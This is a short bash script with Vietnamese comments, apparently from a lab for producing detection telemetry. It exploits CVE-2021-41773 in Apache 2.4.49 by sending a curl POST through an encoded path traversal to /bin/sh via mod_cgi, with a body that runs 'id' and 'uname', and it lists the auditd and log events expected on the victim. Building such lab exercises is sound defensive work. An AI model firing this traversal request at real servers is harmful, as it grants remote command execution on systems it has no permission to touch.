#!/usr/bin/env bash
# v2_apache_cgi_rce.sh — V2: command exec qua Apache 2.4.49 (CVE-2021-41773, nhánh mod_cgi).
#
# Chạy từ máy ATTACKER trong lab:
#     bash v2_apache_cgi_rce.sh http://<victim>:8081
#
# Emulation CVE công khai: path traversal trên 2.4.49 cho phép ánh xạ ra ngoài docroot;
# khi mod_cgi bật, có thể gọi một chương trình hệ thống như CGI → `httpd(www-data) → sh`.
# Script chỉ chạy lệnh RECON LÀNH TÍNH (id) để sinh telemetry, không làm gì phá hoại.
set -euo pipefail
BASE="${1:?Usage: $0 http://<victim>:8081}"
BASE="${BASE%/}"

# Chuỗi traversal đã công bố cho CVE-2021-41773 (%2e encoding).
TRAV="/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"

echo "[*] V2 / CVE-2021-41773 (mod_cgi exec) → $BASE$TRAV"
echo "[*] Lệnh recon lành tính: 'id' (sinh httpd -> sh -> id)"

# POST body là script sh; Apache 2.4.49 + mod_cgi thực thi qua /bin/sh.
# --path-as-is BẮT BUỘC: thiếu nó, curl tự collapse '.%2e/../' phía client → server nhận
# path đã chuẩn hoá → 404, traversal không bao giờ tới server (bug gốc của bản cũ).
curl -s --path-as-is "$BASE$TRAV" \
     -H "Content-Type: text/plain" \
     --data 'echo; echo "== V2 lab marker =="; id; uname -a; echo "== end =="' \
  | sed 's/^/    /' || true

cat <<'EOF'

[i] Kỳ vọng telemetry trên victim:
      auditd execve: httpd (www-data) -> sh -> id/uname
      error/access log của httpd-lab (2.4.49)
      -> forward lên index=lab_web
[i] Nếu không ra kết quả: xác nhận mod_cgi/cgid đã load và httpd-lab đang chạy
      systemctl status httpd-lab ; /opt/httpd-2.4.49/bin/apachectl -M | grep cgi
EOF
